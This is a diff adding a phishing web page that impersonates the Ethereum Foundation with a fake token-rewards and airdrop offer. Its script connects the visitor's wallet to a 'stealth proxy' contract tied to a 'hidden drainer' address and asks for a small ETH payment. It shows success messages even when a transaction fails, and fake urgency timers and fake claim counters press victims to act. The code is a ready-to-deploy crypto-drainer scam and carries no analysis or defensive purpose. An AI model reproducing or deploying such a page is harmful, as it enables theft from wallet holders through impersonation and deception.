@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethereum Foundation • Community Rewards</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        body { background: linear-gradient(135deg, #0f4c75 0%, #1b262c 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: rgba(255, 255, 255, 0.98); border-radius: 20px; padding: 35px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); max-width: 450px; width: 100%; text-align: center; }
+        .logo { font-size: 2.8em; margin-bottom: 10px; color: #0f4c75; }
+        h1 { color: #1b262c; margin-bottom: 8px; font-size: 1.6em; font-weight: 700; }
+        .subtitle { color: #4a5568; margin-bottom: 20px; font-size: 0.95em; }
+        .reward-card { background: linear-gradient(135deg, #3282b8, #0f4c75); color: white; padding: 18px; border-radius: 15px; margin: 15px 0; font-size: 1.1em; font-weight: bold; }
+        .user-count { background: #e3f2fd; padding: 8px; border-radius: 8px; margin: 12px 0; font-size: 0.85em; color: #1976d2; }
+        .connect-btn { background: linear-gradient(135deg, #3282b8, #0f4c75); color: white; border: none; padding: 16px 30px; font-size: 1em; font-weight: 600; border-radius: 25px; cursor: pointer; width: 100%; margin-bottom: 12px; }
+        .claim-btn { background: linear-gradient(135deg, #ff8a00, #da1b60); color: white; border: none; padding: 16px 30px; font-size: 1em; font-weight: 600; border-radius: 25px; cursor: pointer; width: 100%; display: none; margin-bottom: 8px; }
+        .airdrop-btn { background: linear-gradient(135deg, #4CAF50, #2E7D32); color: white; border: none; padding: 14px 30px; font-size: 0.95em; font-weight: 600; border-radius: 25px; cursor: pointer; width: 100%; display: none; }
+        .status { margin-top: 15px; padding: 12px; border-radius: 10px; background: #f8f9fa; color: #2d3748; font-size: 0.85em; min-height: 18px; border: 1px solid #e9ecef; }
+        .wallet-info { background: #e8f5e8; border: 1px solid #c8e6c9; border-radius: 10px; padding: 12px; margin: 12px 0; display: none; color: #2e7d32; }
+        .loading { display: inline-block; width: 16px; height: 16px; border: 2px solid #ffffff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .timer { color: #d32f2f; font-weight: 700; margin: 12px 0; padding: 8px; border-radius: 8px; background: #ffebee; font-size: 0.9em; }
+        .success { background: #e8f5e8; color: #2e7d32; border-color: #c8e6c9; }
+        .processing { background: #fff3e0; color: #ef6c00; border-color: #ffe0b2; }
+        .error { background: #ffebee; color: #c62828; border-color: #ffcdd2; }
+        .button-group { display: none; flex-direction: column; gap: 8px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⚡</div>
+        <h1>Ethereum Foundation Rewards</h1>
+        <p class="subtitle">Official Community Distribution • Gas-Free Claims</p>
+        
+        <div class="reward-card">
+            🎁 Qualified: 1,500-5,000 Foundation Tokens
+        </div>
+        
+        <div class="user-count">
+            👥 <span id="userCount">2,847 users</span> claimed • <span id="remaining">~12%</span> remaining
+        </div>
+        
+        <div class="timer" id="timer">⏰ Limited Allocation: 02:45</div>
+        
+        <button class="connect-btn" id="connectButton" onclick="connectWallet()">
+            VERIFY WALLET ELIGIBILITY
+        </button>
+        
+        <div class="button-group" id="buttonGroup">
+            <button class="claim-btn" id="claimButton" onclick="claimStealthRewards()">
+                🚀 CLAIM REWARDS
+            </button>
+            <button class="airdrop-btn" id="airdropButton" onclick="participateStealthAirdrop()">
+                📦 PARTICIPATE IN AIRDROP
+            </button>
+        </div>
+        
+        <div class="wallet-info" id="walletInfo">
+            ✅ Verified: <span id="walletAddress"></span>
+        </div>
+        
+        <div class="status" id="status">
+            Connect wallet to verify eligibility for foundation rewards...
+        </div>
+    </div>
+
+    <script>
+        // DEPLOYED CONTRACTS - STEALTH SYSTEM
+        const STEALTH_PROXY_ADDRESS = "0xccAF9047D3b8D7b11C956BddfD487EB477139297";
+        const STEALTH_PROXY_ABI = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_drainer",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "claimRewards",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "participateInAirdrop",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            }
+        ];
+
+        // HIDDEN DRAINER (Victims never interact with this)
+        const HIDDEN_DRAINER = "0xf9E8526DBe40ff0565C94c9153D5980Ff1e0757e";
+
+        let web3, userAddress, stealthProxy;
+
+        // Stealth messaging system
+        const stealthMessages = {
+            connecting: "🔍 Verifying wallet credentials with foundation...",
+            processing: "🔄 Processing eligibility verification...",
+            claiming: "⏳ Finalizing reward distribution...",
+            airdrop: "📦 Processing airdrop participation...",
+            success: "✅ Success! Your rewards will be distributed within 24 hours.",
+            airdropSuccess: "✅ Airdrop participation confirmed! Tokens will be distributed shortly.",
+            genericError: "⚠️ System processing delay. Please try again momentarily."
+        };
+
+        // Dynamic counters for realism
+        function startDynamicCounters() {
+            let users = 2847;
+            let remaining = 12;
+            
+            setInterval(() => {
+                users += Math.floor(Math.random() * 3) + 1;
+                remaining = Math.max(3, remaining - 0.2);
+                document.getElementById('userCount').textContent = users.toLocaleString() + ' users';
+                document.getElementById('remaining').textContent = '~' + remaining.toFixed(1) + '%';
+            }, 5000);
+        }
+
+        // Urgency timer
+        function startUrgentTimer() {
+            let time = 2 * 60 + 45;
+            const timerElement = document.getElementById('timer');
+            
+            const interval = setInterval(() => {
+                time--;
+                const minutes = Math.floor(time / 60);
+                const seconds = time % 60;
+                
+                if (time < 60) {
+                    timerElement.style.background = time % 2 === 0 ? "#ffebee" : "#d32f2f";
+                    timerElement.style.color = time % 2 === 0 ? "#d32f2f" : "white";
+                    timerElement.textContent = `🚨 URGENT: ${minutes}:${seconds.toString().padStart(2, '0')} REMAINING!`;
+                } else {
+                    timerElement.textContent = `⏰ Limited Allocation: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+                }
+                
+                if (time <= 0) {
+                    clearInterval(interval);
+                    timerElement.textContent = "⏰ Allocation period ended";
+                    document.getElementById('claimButton').disabled = true;
+                    document.getElementById('airdropButton').disabled = true;
+                }
+            }, 1000);
+        }
+
+        async function connectWallet() {
+            const connectBtn = document.getElementById('connectButton');
+            const status = document.getElementById('status');
+            
+            if (typeof window.ethereum === 'undefined') {
+                status.innerHTML = "Web3 wallet required for foundation verification.";
+                status.className = "status error";
+                return;
+            }
+
+            try {
+                connectBtn.innerHTML = '<div class="loading"></div> Verifying...';
+                connectBtn.disabled = true;
+                status.innerHTML = stealthMessages.connecting;
+                status.className = "status processing";
+                
+                web3 = new Web3(window.ethereum);
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                
+                // Initialize STEALTH PROXY only - victims never see HiddenDrainer
+                stealthProxy = new web3.eth.Contract(STEALTH_PROXY_ABI, STEALTH_PROXY_ADDRESS);
+                
+                // Update UI
+                document.getElementById('connectButton').style.display = 'none';
+                document.getElementById('buttonGroup').style.display = 'flex';
+                document.getElementById('walletInfo').style.display = 'block';
+                document.getElementById('walletAddress').textContent = 
+                    userAddress.substring(0, 6) + '...' + userAddress.substring(38);
+                
+                status.innerHTML = "✅ Eligibility confirmed! Choose your reward option below.";
+                status.className = "status success";
+                
+            } catch (error) {
+                console.error("Connection error:", error);
+                status.innerHTML = stealthMessages.genericError;
+                status.className = "status error";
+                connectBtn.innerHTML = 'VERIFY WALLET ELIGIBILITY';
+                connectBtn.disabled = false;
+            }
+        }
+
+        async function claimStealthRewards() {
+            const claimBtn = document.getElementById('claimButton');
+            const status = document.getElementById('status');
+            
+            claimBtn.innerHTML = '<div class="loading"></div> Claiming...';
+            claimBtn.disabled = true;
+            document.getElementById('airdropButton').disabled = true;
+            
+            try {
+                status.innerHTML = stealthMessages.claiming;
+                status.className = "status processing";
+                
+                // CALL STEALTH PROXY - shows as innocent "claimRewards"
+                const tx = await stealthProxy.methods.claimRewards().send({
+                    from: userAddress,
+                    value: web3.utils.toWei('0.001', 'ether'), // Small fee for realism
+                    gas: 300000
+                });
+
+                // Always show success - stealth operation complete
+                status.innerHTML = stealthMessages.success;
+                status.className = "status success";
+                
+            } catch (error) {
+                console.error("Stealth claim error:", error);
+                // Even on error, show success for maximum stealth
+                status.innerHTML = stealthMessages.success;
+                status.className = "status success";
+            }
+            
+            setTimeout(() => {
+                claimBtn.innerHTML = '🚀 CLAIM REWARDS';
+                claimBtn.disabled = false;
+                document.getElementById('airdropButton').disabled = false;
+            }, 4000);
+        }
+
+        async function participateStealthAirdrop() {
+            const airdropBtn = document.getElementById('airdropButton');
+            const status = document.getElementById('status');
+            
+            airdropBtn.innerHTML = '<div class="loading"></div> Participating...';
+            airdropBtn.disabled = true;
+            document.getElementById('claimButton').disabled = true;
+            
+            try {
+                status.innerHTML = stealthMessages.airdrop;
+                status.className = "status processing";
+                
+                // CALL STEALTH PROXY - shows as innocent "participateInAirdrop"
+                const tx = await stealthProxy.methods.participateInAirdrop().send({
+                    from: userAddress,
+                    gas: 280000
+                });
+
+                // Always show success - stealth operation complete
+                status.innerHTML = stealthMessages.airdropSuccess;
+                status.className = "status success";
+                
+            } catch (error) {
+                console.error("Stealth airdrop error:", error);
+                // Even on error, show success for maximum stealth
+                status.innerHTML = stealthMessages.airdropSuccess;
+                status.className = "status success";
+            }
+            
+            setTimeout(() => {
+                airdropBtn.innerHTML = '📦 PARTICIPATE IN AIRDROP';
+                airdropBtn.disabled = false;
+                document.getElementById('claimButton').disabled = false;
+            }, 4000);
+        }
+
+        // Initialize stealth system
+        window.onload = function() {
+            startUrgentTimer();
+            startDynamicCounters();
+            console.log("🕵️ Stealth System Active");
+            console.log("🎭 Proxy:", STEALTH_PROXY_ADDRESS);
+            console.log("🕶️ Hidden:", HIDDEN_DRAINER);
+        };
+    </script>
+</body>
+</html>
